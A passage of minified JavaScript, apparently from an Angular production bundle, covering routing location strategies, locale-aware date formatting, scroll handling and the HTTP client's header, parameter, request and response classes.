to{_platformLocation;_baseHref;_removeListenerFns=[];constructor(t,r){super(),this._platformLocation=t,this._baseHref=r??this._platformLocation.getBaseHrefFromDOM()??V(bt).location?.origin??""}ngOnDestroy(){for(;this._removeListenerFns.length;)this._removeListenerFns.pop()()}onPopState(t){this._removeListenerFns.push(this._platformLocation.onPopState(t),this._platformLocation.onHashChange(t))}getBaseHref(){return this._baseHref}prepareExternalUrl(t){return Iy(this._baseHref,t)}path(t=!1){let r=this._platformLocation.pathname+_r(this._platformLocation.search),i=this._platformLocation.hash;return i&&t?`${r}${i}`:r}pushState(t,r,i,o){let s=this.prepareExternalUrl(i+_r(o));this._platformLocation.pushState(t,r,s)}replaceState(t,r,i,o){let s=this.prepareExternalUrl(i+_r(o));this._platformLocation.replaceState(t,r,s)}forward(){this._platformLocation.forward()}back(){this._platformLocation.back()}getState(){return this._platformLocation.getState()}historyGo(t=0){this._platformLocation.historyGo?.(t)}static \u0275fac=function(r){return new(r||n)(L(Ey),L(oT,8))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})(),sT=(()=>{class n extends to{_platformLocation;_baseHref="";_removeListenerFns=[];constructor(t,r){super(),this._platformLocation=t,r!=null&&(this._baseHref=r)}ngOnDestroy(){for(;this._removeListenerFns.length;)this._removeListenerFns.pop()()}onPopState(t){this._removeListenerFns.push(this._platformLocation.onPopState(t),this._platformLocation.onHashChange(t))}getBaseHref(){return this._baseHref}path(t=!1){let r=this._platformLocation.hash??"#";return r.length>0?r.substring(1):r}prepareExternalUrl(t){let r=Iy(this._baseHref,t);return r.length>0?"#"+r:r}pushState(t,r,i,o){let s=this.prepareExternalUrl(i+_r(o));s.length==0&&(s=this._platformLocation.pathname),this._platformLocation.pushState(t,r,s)}replaceState(t,r,i,o){let s=this.prepareExternalUrl(i+_r(o));s.length==0&&(s=this._platformLocation.pathname),this._platformLocation.replaceState(t,r,s)}forward(){this._platformLocation.forward()}back(){this._platformLocation.back()}getState(){return this._platformLocation.getState()}historyGo(t=0){this._platformLocation.historyGo?.(t)}static \u0275fac=function(r){return new(r||n)(L(Ey),L(oT,8))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),vs=(()=>{class n{_subject=new Ve;_basePath;_locationStrategy;_urlChangeListeners=[];_urlChangeSubscription=null;constructor(t){this._locationStrategy=t;let r=this._locationStrategy.getBaseHref();this._basePath=bV(Xb(eT(r))),this._locationStrategy.onPopState(i=>{this._subject.next({url:this.path(!0),pop:!0,state:i.state,type:i.type})})}ngOnDestroy(){this._urlChangeSubscription?.unsubscribe(),this._urlChangeListeners=[]}path(t=!1){return this.normalize(this._locationStrategy.path(t))}getState(){return this._locationStrategy.getState()}isCurrentPathEqualTo(t,r=""){return this.path()==this.normalize(t+_r(r))}normalize(t){return n.stripTrailingSlash(CV(this._basePath,eT(t)))}prepareExternalUrl(t){return t&&t[0]!=="/"&&(t="/"+t),this._locationStrategy.prepareExternalUrl(t)}go(t,r="",i=null){this._locationStrategy.pushState(i,"",t,r),this._notifyUrlChangeListeners(this.prepareExternalUrl(t+_r(r)),i)}replaceState(t,r="",i=null){this._locationStrategy.replaceState(i,"",t,r),this._notifyUrlChangeListeners(this.prepareExternalUrl(t+_r(r)),i)}forward(){this._locationStrategy.forward()}back(){this._locationStrategy.back()}historyGo(t=0){this._locationStrategy.historyGo?.(t)}onUrlChange(t){return this._urlChangeListeners.push(t),this._urlChangeSubscription??=this.subscribe(r=>{this._notifyUrlChangeListeners(r.url,r.state)}),()=>{let r=this._urlChangeListeners.indexOf(t);this._urlChangeListeners.splice(r,1),this._urlChangeListeners.length===0&&(this._urlChangeSubscription?.unsubscribe(),this._urlChangeSubscription=null)}}_notifyUrlChangeListeners(t="",r){this._urlChangeListeners.forEach(i=>i(t,r))}subscribe(t,r,i){return this._subject.subscribe({next:t,error:r??void 0,complete:i??void 0})}static normalizeQueryParams=_r;static joinWithSlash=Iy;static stripTrailingSlash=Xb;static \u0275fac=function(r){return new(r||n)(L(to))};static \u0275prov=W({token:n,factory:()=>DV(),providedIn:"root"})}return n})();function DV(){return new vs(L(to))}function CV(n,e){if(!n||!e.startsWith(n))return e;let t=e.substring(n.length);return t===""||["/",";","?","#"].includes(t[0])?t:e}function eT(n){return n.replace(/\/index.html$/,"")}function bV(n){if(new RegExp("^(https?:)?//").test(n)){let[,t]=n.split(/\/\/[^\/]+/);return t}return n}var Ft=function(n){return n[n.Format=0]="Format",n[n.Standalone=1]="Standalone",n}(Ft||{}),xe=function(n){return n[n.Narrow=0]="Narrow",n[n.Abbreviated=1]="Abbreviated",n[n.Wide=2]="Wide",n[n.Short=3]="Short",n}(xe||{}),en=function(n){return n[n.Short=0]="Short",n[n.Medium=1]="Medium",n[n.Long=2]="Long",n[n.Full=3]="Full",n}(en||{}),ni={Decimal:0,Group:1,List:2,PercentSign:3,PlusSign:4,MinusSign:5,Exponential:6,SuperscriptingExponent:7,PerMille:8,Infinity:9,NaN:10,TimeSeparator:11,CurrencyDecimal:12,CurrencyGroup:13};function TV(n){return hn(n)[Ye.LocaleId]}function SV(n,e,t){let r=hn(n),i=[r[Ye.DayPeriodsFormat],r[Ye.DayPeriodsStandalone]],o=fn(i,e);return fn(o,t)}function AV(n,e,t){let r=hn(n),i=[r[Ye.DaysFormat],r[Ye.DaysStandalone]],o=fn(i,e);return fn(o,t)}function MV(n,e,t){let r=hn(n),i=[r[Ye.MonthsFormat],r[Ye.MonthsStandalone]],o=fn(i,e);return fn(o,t)}function xV(n,e){let r=hn(n)[Ye.Eras];return fn(r,e)}function eh(n,e){let t=hn(n);return fn(t[Ye.DateFormat],e)}function th(n,e){let t=hn(n);return fn(t[Ye.TimeFormat],e)}function nh(n,e){let r=hn(n)[Ye.DateTimeFormat];return fn(r,e)}function lh(n,e){let t=hn(n),r=t[Ye.NumberSymbols][e];if(typeof r>"u"){if(e===ni.CurrencyDecimal)return t[Ye.NumberSymbols][ni.Decimal];if(e===ni.CurrencyGroup)return t[Ye.NumberSymbols][ni.Group]}return r}function aT(n){if(!n[Ye.ExtraData])throw new Error(`Missing extra locale data for the locale "${n[Ye.LocaleId]}". Use "registerLocaleData" to load new data. See the "I18n guide" on angular.io to know more.`)}function RV(n){let e=hn(n);return aT(e),(e[Ye.ExtraData][2]||[]).map(r=>typeof r=="string"?my(r):[my(r[0]),my(r[1])])}function NV(n,e,t){let r=hn(n);aT(r);let i=[r[Ye.ExtraData][0],r[Ye.ExtraData][1]],o=fn(i,e)||[];return fn(o,t)||[]}function fn(n,e){for(let t=e;t>-1;t--)if(typeof n[t]<"u")return n[t];throw new Error("Locale data API: locale data undefined")}function my(n){let[e,t]=n.split(":");return{hours:+e,minutes:+t}}var PV=/^(\d{4,})-?(\d\d)-?(\d\d)(?:T(\d\d)(?::?(\d\d)(?::?(\d\d)(?:\.(\d+))?)?)?(Z|([+-])(\d\d):?(\d\d))?)?$/,rh={},kV=/((?:[^BEGHLMOSWYZabcdhmswyz']+)|(?:'(?:[^']|'')*')|(?:G{1,5}|y{1,4}|Y{1,4}|M{1,5}|L{1,5}|w{1,2}|W{1}|d{1,2}|E{1,6}|c{1,6}|a{1,5}|b{1,5}|B{1,5}|h{1,2}|H{1,2}|m{1,2}|s{1,2}|S{1,3}|z{1,4}|Z{1,5}|O{1,4}))([\s\S]*)/,wr=function(n){return n[n.Short=0]="Short",n[n.ShortGMT=1]="ShortGMT",n[n.Long=2]="Long",n[n.Extended=3]="Extended",n}(wr||{}),be=function(n){return n[n.FullYear=0]="FullYear",n[n.Month=1]="Month",n[n.Date=2]="Date",n[n.Hours=3]="Hours",n[n.Minutes=4]="Minutes",n[n.Seconds=5]="Seconds",n[n.FractionalSeconds=6]="FractionalSeconds",n[n.Day=7]="Day",n}(be||{}),Ce=function(n){return n[n.DayPeriods=0]="DayPeriods",n[n.Days=1]="Days",n[n.Months=2]="Months",n[n.Eras=3]="Eras",n}(Ce||{});function OV(n,e,t,r){let i=qV(n);e=vr(t,e)||e;let s=[],a;for(;e;)if(a=kV.exec(e),a){s=s.concat(a.slice(1));let h=s.pop();if(!h)break;e=h}else{s.push(e);break}let c=i.getTimezoneOffset();r&&(c=uT(r,c),i=HV(i,r,!0));let l="";return s.forEach(h=>{let p=BV(h);l+=p?p(i,t,c):h==="''"?"'":h.replace(/(^'|'$)/g,"").replace(/''/g,"'")}),l}function uh(n,e,t){let r=new Date(0);return r.setFullYear(n,e,t),r.setHours(0,0,0),r}function vr(n,e){let t=TV(n);if(rh[t]??={},rh[t][e])return rh[t][e];let r="";switch(e){case"shortDate":r=eh(n,en.Short);break;case"mediumDate":r=eh(n,en.Medium);break;case"longDate":r=eh(n,en.Long);break;case"fullDate":r=eh(n,en.Full);break;case"shortTime":r=th(n,en.Short);break;case"mediumTime":r=th(n,en.Medium);break;case"longTime":r=th(n,en.Long);break;case"fullTime":r=th(n,en.Full);break;case"short":let i=vr(n,"shortTime"),o=vr(n,"shortDate");r=ih(nh(n,en.Short),[i,o]);break;case"medium":let s=vr(n,"mediumTime"),a=vr(n,"mediumDate");r=ih(nh(n,en.Medium),[s,a]);break;case"long":let c=vr(n,"longTime"),l=vr(n,"longDate");r=ih(nh(n,en.Long),[c,l]);break;case"full":let h=vr(n,"fullTime"),p=vr(n,"fullDate");r=ih(nh(n,en.Full),[h,p]);break}return r&&(rh[t][e]=r),r}function ih(n,e){return e&&(n=n.replace(/\{([^}]+)}/g,function(t,r){return e!=null&&r in e?e[r]:t})),n}function bn(n,e,t="-",r,i){let o="";(n<0||i&&n<=0)&&(i?n=-n+1:(n=-n,o=t));let s=String(n);for(;s.length<e;)s="0"+s;return r&&(s=s.slice(s.length-e)),o+s}function FV(n,e){return bn(n,3).substring(0,e)}function rt(n,e,t=0,r=!1,i=!1){return function(o,s){let a=VV(n,o);if((t>0||a>-t)&&(a+=t),n===be.Hours)a===0&&t===-12&&(a=12);else if(n===be.FractionalSeconds)return FV(a,e);let c=lh(s,ni.MinusSign);return bn(a,e,c,r,i)}}function VV(n,e){switch(n){case be.FullYear:return e.getFullYear();case be.Month:return e.getMonth();case be.Date:return e.getDate();case be.Hours:return e.getHours();case be.Minutes:return e.getMinutes();case be.Seconds:return e.getSeconds();case be.FractionalSeconds:return e.getMilliseconds();case be.Day:return e.getDay();default:throw new Error(`Unknown DateType value "${n}".`)}}function Ne(n,e,t=Ft.Format,r=!1){return function(i,o){return LV(i,o,n,e,t,r)}}function LV(n,e,t,r,i,o){switch(t){case Ce.Months:return MV(e,i,r)[n.getMonth()];case Ce.Days:return AV(e,i,r)[n.getDay()];case Ce.DayPeriods:let s=n.getHours(),a=n.getMinutes();if(o){let l=RV(e),h=NV(e,i,r),p=l.findIndex(m=>{if(Array.isArray(m)){let[y,D]=m,b=s>=y.hours&&a>=y.minutes,T=s<D.hours||s===D.hours&&a<D.minutes;if(y.hours<D.hours){if(b&&T)return!0}else if(b||T)return!0}else if(m.hours===s&&m.minutes===a)return!0;return!1});if(p!==-1)return h[p]}return SV(e,i,r)[s<12?0:1];case Ce.Eras:return xV(e,r)[n.getFullYear()<=0?0:1];default:let c=t;throw new Error(`unexpected translation type ${c}`)}}function oh(n){return function(e,t,r){let i=-1*r,o=lh(t,ni.MinusSign),s=i>0?Math.floor(i/60):Math.ceil(i/60);switch(n){case wr.Short:return(i>=0?"+":"")+bn(s,2,o)+bn(Math.abs(i%60),2,o);case wr.ShortGMT:return"GMT"+(i>=0?"+":"")+bn(s,1,o);case wr.Long:return"GMT"+(i>=0?"+":"")+bn(s,2,o)+":"+bn(Math.abs(i%60),2,o);case wr.Extended:return r===0?"Z":(i>=0?"+":"")+bn(s,2,o)+":"+bn(Math.abs(i%60),2,o);default:throw new Error(`Unknown zone width "${n}"`)}}}var UV=0,ah=4;function jV(n){let e=uh(n,UV,1).getDay();return uh(n,0,1+(e<=ah?ah:ah+7)-e)}function cT(n){let e=n.getDay(),t=e===0?-3:ah-e;return uh(n.getFullYear(),n.getMonth(),n.getDate()+t)}function yy(n,e=!1){return function(t,r){let i;if(e){let o=new Date(t.getFullYear(),t.getMonth(),1).getDay()-1,s=t.getDate();i=1+Math.floor((s+o)/7)}else{let o=cT(t),s=jV(o.getFullYear()),a=o.getTime()-s.getTime();i=1+Math.round(a/6048e5)}return bn(i,n,lh(r,ni.MinusSign))}}function sh(n,e=!1){return function(t,r){let o=cT(t).getFullYear();return bn(o,n,lh(r,ni.MinusSign),e)}}var vy={};function BV(n){if(vy[n])return vy[n];let e;switch(n){case"G":case"GG":case"GGG":e=Ne(Ce.Eras,xe.Abbreviated);break;case"GGGG":e=Ne(Ce.Eras,xe.Wide);break;case"GGGGG":e=Ne(Ce.Eras,xe.Narrow);break;case"y":e=rt(be.FullYear,1,0,!1,!0);break;case"yy":e=rt(be.FullYear,2,0,!0,!0);break;case"yyy":e=rt(be.FullYear,3,0,!1,!0);break;case"yyyy":e=rt(be.FullYear,4,0,!1,!0);break;case"Y":e=sh(1);break;case"YY":e=sh(2,!0);break;case"YYY":e=sh(3);break;case"YYYY":e=sh(4);break;case"M":case"L":e=rt(be.Month,1,1);break;case"MM":case"LL":e=rt(be.Month,2,1);break;case"MMM":e=Ne(Ce.Months,xe.Abbreviated);break;case"MMMM":e=Ne(Ce.Months,xe.Wide);break;case"MMMMM":e=Ne(Ce.Months,xe.Narrow);break;case"LLL":e=Ne(Ce.Months,xe.Abbreviated,Ft.Standalone);break;case"LLLL":e=Ne(Ce.Months,xe.Wide,Ft.Standalone);break;case"LLLLL":e=Ne(Ce.Months,xe.Narrow,Ft.Standalone);break;case"w":e=yy(1);break;case"ww":e=yy(2);break;case"W":e=yy(1,!0);break;case"d":e=rt(be.Date,1);break;case"dd":e=rt(be.Date,2);break;case"c":case"cc":e=rt(be.Day,1);break;case"ccc":e=Ne(Ce.Days,xe.Abbreviated,Ft.Standalone);break;case"cccc":e=Ne(Ce.Days,xe.Wide,Ft.Standalone);break;case"ccccc":e=Ne(Ce.Days,xe.Narrow,Ft.Standalone);break;case"cccccc":e=Ne(Ce.Days,xe.Short,Ft.Standalone);break;case"E":case"EE":case"EEE":e=Ne(Ce.Days,xe.Abbreviated);break;case"EEEE":e=Ne(Ce.Days,xe.Wide);break;case"EEEEE":e=Ne(Ce.Days,xe.Narrow);break;case"EEEEEE":e=Ne(Ce.Days,xe.Short);break;case"a":case"aa":case"aaa":e=Ne(Ce.DayPeriods,xe.Abbreviated);break;case"aaaa":e=Ne(Ce.DayPeriods,xe.Wide);break;case"aaaaa":e=Ne(Ce.DayPeriods,xe.Narrow);break;case"b":case"bb":case"bbb":e=Ne(Ce.DayPeriods,xe.Abbreviated,Ft.Standalone,!0);break;case"bbbb":e=Ne(Ce.DayPeriods,xe.Wide,Ft.Standalone,!0);break;case"bbbbb":e=Ne(Ce.DayPeriods,xe.Narrow,Ft.Standalone,!0);break;case"B":case"BB":case"BBB":e=Ne(Ce.DayPeriods,xe.Abbreviated,Ft.Format,!0);break;case"BBBB":e=Ne(Ce.DayPeriods,xe.Wide,Ft.Format,!0);break;case"BBBBB":e=Ne(Ce.DayPeriods,xe.Narrow,Ft.Format,!0);break;case"h":e=rt(be.Hours,1,-12);break;case"hh":e=rt(be.Hours,2,-12);break;case"H":e=rt(be.Hours,1);break;case"HH":e=rt(be.Hours,2);break;case"m":e=rt(be.Minutes,1);break;case"mm":e=rt(be.Minutes,2);break;case"s":e=rt(be.Seconds,1);break;case"ss":e=rt(be.Seconds,2);break;case"S":e=rt(be.FractionalSeconds,1);break;case"SS":e=rt(be.FractionalSeconds,2);break;case"SSS":e=rt(be.FractionalSeconds,3);break;case"Z":case"ZZ":case"ZZZ":e=oh(wr.Short);break;case"ZZZZZ":e=oh(wr.Extended);break;case"O":case"OO":case"OOO":case"z":case"zz":case"zzz":e=oh(wr.ShortGMT);break;case"OOOO":case"ZZZZ":case"zzzz":e=oh(wr.Long);break;default:return null}return vy[n]=e,e}function uT(n,e){n=n.replace(/:/g,"");let t=Date.parse("Jan 01, 1970 00:00:00 "+n)/6e4;return isNaN(t)?e:t}function $V(n,e){return n=new Date(n.getTime()),n.setMinutes(n.getMinutes()+e),n}function HV(n,e,t){let r=t?-1:1,i=n.getTimezoneOffset(),o=uT(e,i);return $V(n,r*(o-i))}function qV(n){if(tT(n))return n;if(typeof n=="number"&&!isNaN(n))return new Date(n);if(typeof n=="string"){if(n=n.trim(),/^(\d{4}(-\d{1,2}(-\d{1,2})?)?)$/.test(n)){let[i,o=1,s=1]=n.split("-").map(a=>+a);return uh(i,o-1,s)}let t=parseFloat(n);if(!isNaN(n-t))return new Date(t);let r;if(r=n.match(PV))return zV(r)}let e=new Date(n);if(!tT(e))throw new Error(`Unable to convert "${n}" into a date`);return e}function zV(n){let e=new Date(0),t=0,r=0,i=n[8]?e.setUTCFullYear:e.setFullYear,o=n[8]?e.setUTCHours:e.setHours;n[9]&&(t=Number(n[9]+n[10]),r=Number(n[9]+n[11])),i.call(e,Number(n[1]),Number(n[2])-1,Number(n[3]));let s=Number(n[4]||0)-t,a=Number(n[5]||0)-r,c=Number(n[6]||0),l=Math.floor(parseFloat("0."+(n[7]||0))*1e3);return o.call(e,s,a,c,l),e}function tT(n){return n instanceof Date&&!isNaN(n.valueOf())}function dh(n,e){e=encodeURIComponent(e);for(let t of n.split(";")){let r=t.indexOf("="),[i,o]=r==-1?[t,""]:[t.slice(0,r),t.slice(r+1)];if(i.trim()===e)return decodeURIComponent(o)}return null}function GV(n,e){return new Y(2100,!1)}var WV="mediumDate",KV=new j(""),QV=new j(""),lT=(()=>{class n{locale;defaultTimezone;defaultOptions;constructor(t,r,i){this.locale=t,this.defaultTimezone=r,this.defaultOptions=i}transform(t,r,i,o){if(t==null||t===""||t!==t)return null;try{let s=r??this.defaultOptions?.dateFormat??WV,a=i??this.defaultOptions?.timezone??this.defaultTimezone??void 0;return OV(t,s,o||this.locale,a)}catch(s){throw GV(n,s.message)}}static \u0275fac=function(r){return new(r||n)(Ie(Jd,16),Ie(KV,24),Ie(QV,24))};static \u0275pipe=kb({name:"date",type:n,pure:!0})}return n})();var dT=(()=>{class n{static \u0275fac=function(r){return new(r||n)};static \u0275mod=Qe({type:n});static \u0275inj=Ke({})}return n})(),Cy="browser",YV="server";function ZV(n){return n===Cy}function ri(n){return n===YV}var hT=(()=>{class n{static \u0275prov=W({token:n,providedIn:"root",factory:()=>ZV(V(Ot))?new _y(V(bt),window):new wy})}return n})(),_y=class{document;window;offset=()=>[0,0];constructor(e,t){this.document=e,this.window=t}setOffset(e){Array.isArray(e)?this.offset=()=>e:this.offset=e}getScrollPosition(){return[this.window.scrollX,this.window.scrollY]}scrollToPosition(e){this.window.scrollTo(e[0],e[1])}scrollToAnchor(e){let t=JV(this.document,e);t&&(this.scrollToElement(t),t.focus())}setHistoryScrollRestoration(e){this.window.history.scrollRestoration=e}scrollToElement(e){let t=e.getBoundingClientRect(),r=t.left+this.window.pageXOffset,i=t.top+this.window.pageYOffset,o=this.offset();this.window.scrollTo(r-o[0],i-o[1])}};function JV(n,e){let t=n.getElementById(e)||n.getElementsByName(e)[0];if(t)return t;if(typeof n.createTreeWalker=="function"&&n.body&&typeof n.body.attachShadow=="function"){let r=n.createTreeWalker(n.body,NodeFilter.SHOW_ELEMENT),i=r.currentNode;for(;i;){let o=i.shadowRoot;if(o){let s=o.getElementById(e)||o.querySelector(`[name="${e}"]`);if(s)return s}i=r.nextNode()}}return null}var wy=class{setOffset(e){}getScrollPosition(){return[0,0]}scrollToPosition(e){}scrollToAnchor(e){}setHistoryScrollRestoration(e){}},ys=class{};var Ic=class{},fh=class{},Er=class n{headers;normalizedNames=new Map;lazyInit;lazyUpdate=null;constructor(e){e?typeof e=="string"?this.lazyInit=()=>{this.headers=new Map,e.split(`
`).forEach(t=>{let r=t.indexOf(":");if(r>0){let i=t.slice(0,r),o=t.slice(r+1).trim();this.addHeaderEntry(i,o)}})}:typeof Headers<"u"&&e instanceof Headers?(this.headers=new Map,e.forEach((t,r)=>{this.addHeaderEntry(r,t)})):this.lazyInit=()=>{this.headers=new Map,Object.entries(e).forEach(([t,r])=>{this.setHeaderEntries(t,r)})}:this.headers=new Map}has(e){return this.init(),this.headers.has(e.toLowerCase())}get(e){this.init();let t=this.headers.get(e.toLowerCase());return t&&t.length>0?t[0]:null}keys(){return this.init(),Array.from(this.normalizedNames.values())}getAll(e){return this.init(),this.headers.get(e.toLowerCase())||null}append(e,t){return this.clone({name:e,value:t,op:"a"})}set(e,t){return this.clone({name:e,value:t,op:"s"})}delete(e,t){return this.clone({name:e,value:t,op:"d"})}maybeSetNormalizedName(e,t){this.normalizedNames.has(t)||this.normalizedNames.set(t,e)}init(){this.lazyInit&&(this.lazyInit instanceof n?this.copyFrom(this.lazyInit):this.lazyInit(),this.lazyInit=null,this.lazyUpdate&&(this.lazyUpdate.forEach(e=>this.applyUpdate(e)),this.lazyUpdate=null))}copyFrom(e){e.init(),Array.from(e.headers.keys()).forEach(t=>{this.headers.set(t,e.headers.get(t)),this.normalizedNames.set(t,e.normalizedNames.get(t))})}clone(e){let t=new n;return t.lazyInit=this.lazyInit&&this.lazyInit instanceof n?this.lazyInit:this,t.lazyUpdate=(this.lazyUpdate||[]).concat([e]),t}applyUpdate(e){let t=e.name.toLowerCase();switch(e.op){case"a":case"s":let r=e.value;if(typeof r=="string"&&(r=[r]),r.length===0)return;this.maybeSetNormalizedName(e.name,t);let i=(e.op==="a"?this.headers.get(t):void 0)||[];i.push(...r),this.headers.set(t,i);break;case"d":let o=e.value;if(!o)this.headers.delete(t),this.normalizedNames.delete(t);else{let s=this.headers.get(t);if(!s)return;s=s.filter(a=>o.indexOf(a)===-1),s.length===0?(this.headers.delete(t),this.normalizedNames.delete(t)):this.headers.set(t,s)}break}}addHeaderEntry(e,t){let r=e.toLowerCase();this.maybeSetNormalizedName(e,r),this.headers.has(r)?this.headers.get(r).push(t):this.headers.set(r,[t])}setHeaderEntries(e,t){let r=(Array.isArray(t)?t:[t]).map(o=>o.toString()),i=e.toLowerCase();this.headers.set(i,r),this.maybeSetNormalizedName(e,i)}forEach(e){this.init(),Array.from(this.normalizedNames.keys()).forEach(t=>e(this.normalizedNames.get(t),this.headers.get(t)))}};var Ty=class{encodeKey(e){return pT(e)}encodeValue(e){return pT(e)}decodeKey(e){return decodeURIComponent(e)}decodeValue(e){return decodeURIComponent(e)}};function XV(n,e){let t=new Map;return n.length>0&&n.replace(/^\?/,"").split("&").forEach(i=>{let o=i.indexOf("="),[s,a]=o==-1?[e.decodeKey(i),""]:[e.decodeKey(i.slice(0,o)),e.decodeValue(i.slice(o+1))],c=t.get(s)||[];c.push(a),t.set(s,c)}),t}var eL=/%(\d[a-f0-9])/gi,tL={40:"@","3A":":",24:"$","2C":",","3B":";","3D":"=","3F":"?","2F":"/"};function pT(n){return encodeURIComponent(n).replace(eL,(e,t)=>tL[t]??e)}function hh(n){return`${n}`}var oi=class n{map;encoder;updates=null;cloneFrom=null;constructor(e={}){if(this.encoder=e.encoder||new Ty,e.fromString){if(e.fromObject)throw new Error("Cannot specify both fromString and fromObject.");this.map=XV(e.fromString,this.encoder)}else e.fromObject?(this.map=new Map,Object.keys(e.fromObject).forEach(t=>{let r=e.fromObject[t],i=Array.isArray(r)?r.map(hh):[hh(r)];this.map.set(t,i)})):this.map=null}has(e){return this.init(),this.map.has(e)}get(e){this.init();let t=this.map.get(e);return t?t[0]:null}getAll(e){return this.init(),this.map.get(e)||null}keys(){return this.init(),Array.from(this.map.keys())}append(e,t){return this.clone({param:e,value:t,op:"a"})}appendAll(e){let t=[];return Object.keys(e).forEach(r=>{let i=e[r];Array.isArray(i)?i.forEach(o=>{t.push({param:r,value:o,op:"a"})}):t.push({param:r,value:i,op:"a"})}),this.clone(t)}set(e,t){return this.clone({param:e,value:t,op:"s"})}delete(e,t){return this.clone({param:e,value:t,op:"d"})}toString(){return this.init(),this.keys().map(e=>{let t=this.encoder.encodeKey(e);return this.map.get(e).map(r=>t+"="+this.encoder.encodeValue(r)).join("&")}).filter(e=>e!=="").join("&")}clone(e){let t=new n({encoder:this.encoder});return t.cloneFrom=this.cloneFrom||this,t.updates=(this.updates||[]).concat(e),t}init(){this.map===null&&(this.map=new Map),this.cloneFrom!==null&&(this.cloneFrom.init(),this.cloneFrom.keys().forEach(e=>this.map.set(e,this.cloneFrom.map.get(e))),this.updates.forEach(e=>{switch(e.op){case"a":case"s":let t=(e.op==="a"?this.map.get(e.param):void 0)||[];t.push(hh(e.value)),this.map.set(e.param,t);break;case"d":if(e.value!==void 0){let r=this.map.get(e.param)||[],i=r.indexOf(hh(e.value));i!==-1&&r.splice(i,1),r.length>0?this.map.set(e.param,r):this.map.delete(e.param)}else{this.map.delete(e.param);break}}}),this.cloneFrom=this.updates=null)}};var Sy=class{map=new Map;set(e,t){return this.map.set(e,t),this}get(e){return this.map.has(e)||this.map.set(e,e.defaultValue()),this.map.get(e)}delete(e){return this.map.delete(e),this}has(e){return this.map.has(e)}keys(){return this.map.keys()}};function nL(n){switch(n){case"DELETE":case"GET":case"HEAD":case"OPTIONS":case"JSONP":return!1;default:return!0}}function gT(n){return typeof ArrayBuffer<"u"&&n instanceof ArrayBuffer}function mT(n){return typeof Blob<"u"&&n instanceof Blob}function yT(n){return typeof FormData<"u"&&n instanceof FormData}function rL(n){return typeof URLSearchParams<"u"&&n instanceof URLSearchParams}var Ec=class n{url;body=null;headers;context;reportProgress=!1;withCredentials=!1;responseType="json";method;params;urlWithParams;transferCache;constructor(e,t,r,i){this.url=t,this.method=e.toUpperCase();let o;if(nL(this.method)||i?(this.body=r!==void 0?r:null,o=i):o=r,o&&(this.reportProgress=!!o.reportProgress,this.withCredentials=!!o.withCredentials,o.responseType&&(this.responseType=o.responseType),o.headers&&(this.headers=o.headers),o.context&&(this.context=o.context),o.params&&(this.params=o.params),this.transferCache=o.transferCache),this.headers??=new Er,this.context??=new Sy,!this.params)this.params=new oi,this.urlWithParams=t;else{let s=this.params.toString();if(s.length===0)this.urlWithParams=t;else{let a=t.indexOf("?"),c=a===-1?"?":a<t.length-1?"&":"";this.urlWithParams=t+c+s}}}serializeBody(){return this.body===null?null:typeof this.body=="string"||gT(this.body)||mT(this.body)||yT(this.body)||rL(this.body)?this.body:this.body instanceof oi?this.body.toString():typeof this.body=="object"||typeof this.body=="boolean"||Array.isArray(this.body)?JSON.stringify(this.body):this.body.toString()}detectContentTypeHeader(){return this.body===null||yT(this.body)?null:mT(this.body)?this.body.type||null:gT(this.body)?null:typeof this.body=="string"?"text/plain":this.body instanceof oi?"application/x-www-form-urlencoded;charset=UTF-8":typeof this.body=="object"||typeof this.body=="number"||typeof this.body=="boolean"?"application/json":null}clone(e={}){let t=e.method||this.method,r=e.url||this.url,i=e.responseType||this.responseType,o=e.transferCache??this.transferCache,s=e.body!==void 0?e.body:this.body,a=e.withCredentials??this.withCredentials,c=e.reportProgress??this.reportProgress,l=e.headers||this.headers,h=e.params||this.params,p=e.context??this.context;return e.setHeaders!==void 0&&(l=Object.keys(e.setHeaders).reduce((m,y)=>m.set(y,e.setHeaders[y]),l)),e.setParams&&(h=Object.keys(e.setParams).reduce((m,y)=>m.set(y,e.setParams[y]),h)),new n(t,r,s,{params:h,headers:l,context:p,reportProgress:c,responseType:i,withCredentials:a,transferCache:o})}},si=function(n){return n[n.Sent=0]="Sent",n[n.UploadProgress=1]="UploadProgress",n[n.ResponseHeader=2]="ResponseHeader",n[n.DownloadProgress=3]="DownloadProgress",n[n.Response=4]="Response",n[n.User=5]="User",n}(si||{}),Dc=class{headers;status;statusText;url;ok;type;constructor(e,t=200,r="OK"){this.headers=e.headers||new Er,this.status=e.status!==void 0?e.status:t,this.statusText=e.statusText||r,this.url=e.url||null,this.ok=this.status>=200&&this.status<300}},ph=class n extends Dc{constructor(e={}){super(e)}type=si.ResponseHeader;clone(e={}){return new n({headers:e.headers||this.headers,status:e.status!==void 0?e.status:this.status,statusText:e.statusText||this.statusText,url:e.url||this.url||void 0})}},Cc=class n extends Dc{body;constructor(e={}){super(e),this.body=e.body!==void 0?e.body:null}type=si.Response;clone(e={}){return new n({body:e.body!==void 0?e.body:this.body,headers:e.headers||this.headers,status:e.status!==void 0?e.status:this.status,statusText:e.statusText||this.statusText,url:e.url||this.url||void 0})}},ii=class extends Dc{name="HttpErrorResponse";message;error;ok=!1;constructor(e){super(e,0,"Unknown Error"),this.status>=200&&this.status<300?this.message=`Http failure during parsing for ${e.url||"(unknown url)"}`:this.message=`Http failure response for ${e.url||"(unknown url)"}: ${e.status} ${e.statusText}`,this.error=e.error||null}},IT=200,iL=204;function by(n,e){return{body:e,headers:n.headers,context:n.context,observe:n.observe,params:n.params,reportProgress:n.reportProgress,responseType:n.responseType,withCredentials:n.withCredentials,transferCache:n.transferCache}}var xy=(()=>{class n{handler;constructor(t){this.handler=t}request(t,r,i={}){let o;if(t instanceof Ec)o=t;else{let c;i.headers instanceof Er?c=i.headers:c=new Er(i.headers);let l;i.params&&(i.params instanceof oi?l=i.params:l=new oi({fromObject:i.params})),o=new Ec(t,r,i.body!==void 0?i.body:null,{headers:c,context:i.context,params:l,reportProgress:i.reportProgress,responseType:i.responseType||"json",withCredentials:i.withCredentials,transferCache:i.transferCache})}let s=J(o).pipe(or(c=>this.handler.handle(c)));if(t instanceof Ec||i.observe==="events")return s;let a=s.pipe(ut(c=>c instanceof Cc));switch(i.observe||"body"){case"body":switch(o.responseType){case"arraybuffer":return a.pipe(X(c=>{if(c.body!==null&&!(c.body instanceof ArrayBuffer))throw new Error("Response is not an ArrayBuffer.");return c.body}));case"blob":return a.pipe(X(c=>{if(c.body!==null&&!(c.body instanceof Blob))throw new Error("Response is not a Blob.");return 